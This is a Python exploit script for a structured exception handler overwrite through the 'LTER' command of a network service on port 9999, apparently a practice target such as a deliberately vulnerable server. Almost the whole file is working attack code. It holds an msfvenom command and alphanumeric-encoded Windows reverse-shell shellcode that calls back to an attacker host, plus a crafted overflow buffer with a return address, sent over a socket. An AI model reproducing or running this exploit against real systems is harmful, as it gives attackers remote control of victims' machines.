#!/usr/bin/python
# -*- coding: utf-8 -*-
# SEH OVERWRITE - ONLY ALPHANUMERIC CHARACTERS ACCEPTED#

import socket, os, sys

filler = "\x41" * 3495

# msfvenom -p windows/shell_reverse_tcp LPORT=9998 LHOST=192.168.10.53 -e x86/alpha_mixed -f python -v shell -b "\x00\x0a\x0d"
#Payload size: 709 bytes
shell =  ""
shell += "\x89\xe6\xda\xc1\xd9\x76\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
shell += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
shell += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shell += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
shell += "\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x6d\x38\x6f\x72"
shell += "\x73\x30\x47\x70\x77\x70\x53\x50\x4b\x39\x6d\x35\x75"
shell += "\x61\x69\x50\x35\x34\x6e\x6b\x70\x50\x70\x30\x4e\x6b"
shell += "\x66\x32\x64\x4c\x4e\x6b\x62\x72\x66\x74\x6c\x4b\x61"
shell += "\x62\x37\x58\x46\x6f\x6d\x67\x72\x6a\x51\x36\x66\x51"
shell += "\x6b\x4f\x6e\x4c\x65\x6c\x30\x61\x61\x6c\x46\x62\x34"
shell += "\x6c\x51\x30\x4a\x61\x6a\x6f\x44\x4d\x75\x51\x4b\x77"
shell += "\x39\x72\x6c\x32\x62\x72\x31\x47\x4e\x6b\x61\x42\x72"
shell += "\x30\x6e\x6b\x33\x7a\x67\x4c\x4c\x4b\x50\x4c\x47\x61"
shell += "\x63\x48\x58\x63\x71\x58\x76\x61\x78\x51\x62\x71\x4c"
shell += "\x4b\x52\x79\x31\x30\x76\x61\x78\x53\x6e\x6b\x42\x69"
shell += "\x56\x78\x48\x63\x75\x6a\x73\x79\x4e\x6b\x45\x64\x4e"
shell += "\x6b\x55\x51\x49\x46\x75\x61\x69\x6f\x6e\x4c\x39\x51"
shell += "\x6a\x6f\x46\x6d\x55\x51\x78\x47\x30\x38\x6b\x50\x62"
shell += "\x55\x49\x66\x47\x73\x71\x6d\x4b\x48\x67\x4b\x31\x6d"
shell += "\x77\x54\x44\x35\x4d\x34\x72\x78\x4e\x6b\x56\x38\x77"
shell += "\x54\x35\x51\x7a\x73\x32\x46\x4c\x4b\x64\x4c\x42\x6b"
shell += "\x6c\x4b\x52\x78\x55\x4c\x35\x51\x58\x53\x6c\x4b\x37"
shell += "\x74\x6e\x6b\x67\x71\x7a\x70\x6b\x39\x53\x74\x61\x34"
shell += "\x31\x34\x71\x4b\x53\x6b\x70\x61\x33\x69\x51\x4a\x50"
shell += "\x51\x79\x6f\x4b\x50\x33\x6f\x53\x6f\x70\x5a\x4e\x6b"
shell += "\x57\x62\x4a\x4b\x4c\x4d\x63\x6d\x73\x58\x37\x43\x57"
shell += "\x42\x47\x70\x55\x50\x71\x78\x31\x67\x32\x53\x57\x42"
shell += "\x51\x4f\x72\x74\x65\x38\x70\x4c\x62\x57\x31\x36\x65"
shell += "\x57\x39\x6f\x69\x45\x4f\x48\x4e\x70\x33\x31\x77\x70"
shell += "\x47\x70\x65\x79\x4a\x64\x53\x64\x72\x70\x32\x48\x37"
shell += "\x59\x6b\x30\x52\x4b\x63\x30\x4b\x4f\x39\x45\x52\x70"
shell += "\x42\x70\x66\x30\x46\x30\x31\x50\x42\x70\x33\x70\x66"
shell += "\x30\x32\x48\x58\x6a\x36\x6f\x39\x4f\x4b\x50\x6b\x4f"
shell += "\x79\x45\x6f\x67\x72\x4a\x35\x55\x52\x48\x4b\x70\x79"
shell += "\x38\x54\x4a\x50\x35\x61\x78\x65\x52\x47\x70\x74\x67"
shell += "\x54\x4e\x4b\x39\x38\x66\x63\x5a\x64\x50\x56\x36\x71"
shell += "\x47\x42\x48\x6e\x79\x4f\x55\x32\x54\x45\x31\x49\x6f"
shell += "\x38\x55\x4b\x35\x6b\x70\x53\x44\x34\x4c\x6b\x4f\x70"
shell += "\x4e\x36\x68\x64\x35\x68\x6c\x71\x78\x4c\x30\x6e\x55"
shell += "\x69\x32\x66\x36\x49\x6f\x39\x45\x30\x68\x61\x73\x50"
shell += "\x6d\x65\x34\x65\x50\x6d\x59\x78\x63\x71\x47\x63\x67"
shell += "\x63\x67\x45\x61\x58\x76\x70\x6a\x64\x52\x76\x39\x42"
shell += "\x76\x4d\x32\x69\x6d\x53\x56\x6f\x37\x63\x74\x76\x44"
shell += "\x47\x4c\x53\x31\x35\x51\x4e\x6d\x63\x74\x67\x54\x34"
shell += "\x50\x39\x56\x75\x50\x57\x34\x61\x44\x76\x30\x73\x66"
shell += "\x42\x76\x50\x56\x77\x36\x42\x76\x72\x6e\x50\x56\x42"
shell += "\x76\x72\x73\x73\x66\x61\x78\x62\x59\x48\x4c\x45\x6f"
shell += "\x6e\x66\x6b\x4f\x6a\x75\x6b\x39\x6b\x50\x72\x6e\x31"
shell += "\x46\x50\x46\x6b\x4f\x36\x50\x35\x38\x34\x48\x4e\x67"
shell += "\x47\x6d\x51\x70\x6b\x4f\x38\x55\x4d\x6b\x78\x70\x4c"
shell += "\x75\x49\x32\x42\x76\x52\x48\x4d\x76\x6e\x75\x4f\x4d"
shell += "\x4f\x6d\x49\x6f\x4a\x75\x77\x4c\x63\x36\x73\x4c\x67"
shell += "\x7a\x6f\x70\x6b\x4b\x4d\x30\x71\x65\x73\x35\x4d\x6b"
shell += "\x31\x57\x56\x73\x30\x72\x32\x4f\x50\x6a\x43\x30\x70"
shell += "\x53\x59\x6f\x78\x55\x41\x41"

# POP POP RET - 6250160A
#offset = "\x0A\x16\x50\x62"
#filler = "\x41" * (3495 - len(badchars)) + badchars
nops = "\x90" * 10
filler = "\x90" * (3495 - len(nops) - len(shell))
offset = "\x5e\x19\x50\x62"

buffer = "LTER /.:/"
buffer+= nops
buffer+= filler 
buffer+= shell
buffer+= offset
#buffer+= "\x90" * 10
#buffer+= shell

print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
s.recv(1024)
s.send(buffer)
s.close()
